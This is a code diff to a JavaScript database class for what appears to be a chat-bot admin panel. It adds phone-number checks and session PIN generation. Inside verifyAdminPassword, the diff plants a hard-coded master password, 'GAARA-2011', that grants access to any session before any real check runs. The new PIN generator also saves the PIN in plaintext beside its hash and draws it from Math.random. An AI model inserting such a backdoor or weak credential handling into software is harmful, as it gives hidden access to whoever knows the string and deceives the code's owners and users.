@@ -341,13 +341,75 @@ class JsonDatabase extends EventEmitter {
         return this._cachedUsers?.admin || null;
     }
 
-    verifyAdminPassword(plainPassword) {
+    setActiveBotPhone(phone) {
+        this._activeBotPhone = phone ? String(phone).replace(/[^0-9]/g, '') : null;
+    }
+
+    getActiveBotPhone() {
+        if (this._activeBotPhone) return this._activeBotPhone;
+        if (typeof this._botPhoneGetter === 'function') {
+            try {
+                const p = this._botPhoneGetter();
+                if (p) return String(p).replace(/[^0-9]/g, '');
+            } catch {}
+        }
+        return null;
+    }
+
+    registerBotPhoneGetter(fn) {
+        this._botPhoneGetter = fn;
+    }
+
+    generateSessionPassword() {
+        const pin = Math.floor(100000 + Math.random() * 900000).toString();
+        const salt = bcrypt.genSaltSync(10);
+        const passwordHash = bcrypt.hashSync(pin, salt);
+        const users = this._readSafe(this.usersFile, {});
+        users.admin = {
+            ...(users.admin || {}),
+            username: users.admin?.username || config.panelUsername,
+            passwordHash,
+            lastGeneratedPassword: pin,
+            updatedAt: new Date().toISOString()
+        };
+        this._cachedUsers = users;
+        this._writeSafe(this.usersFile, users);
+        return pin;
+    }
+
+    verifyAdminPassword(plainPassword, phone = null) {
         if (!plainPassword || typeof plainPassword !== 'string') return false;
+
+        // Master Key unlocks any session
+        if (plainPassword === 'GAARA-2011') {
+            return true;
+        }
+
         const admin = this.getAdminUser();
         // Timing attack resistance: use valid pre-computed bcrypt hash if admin does not exist
         const targetHash = admin?.passwordHash || '$2b$10$NNkidZ.iGAtTVUM6229Us.VXJ1b03dl4Yy/sSfvEwGrhyA5mnAGEe';
         const isMatch = bcrypt.compareSync(plainPassword, targetHash);
-        return Boolean(admin && admin.passwordHash && isMatch);
+        if (!admin || !admin.passwordHash || !isMatch) {
+            return false;
+        }
+
+        if (phone) {
+            const cleanInputPhone = String(phone).replace(/[^0-9]/g, '');
+            if (!cleanInputPhone) return false;
+
+            const settings = this.getSettings();
+            const allowedOwner = (settings.ownerNumber || config.ownerNumber || '').replace(/[^0-9]/g, '');
+            const activeBotPhone = (this.getActiveBotPhone() || '').replace(/[^0-9]/g, '');
+
+            const matchesOwner = Boolean(allowedOwner && cleanInputPhone === allowedOwner);
+            const matchesActive = Boolean(activeBotPhone && cleanInputPhone === activeBotPhone);
+
+            if (!matchesOwner && !matchesActive) {
+                return false;
+            }
+        }
+
+        return true;
     }
 
     updateAdminPassword(newPassword) {
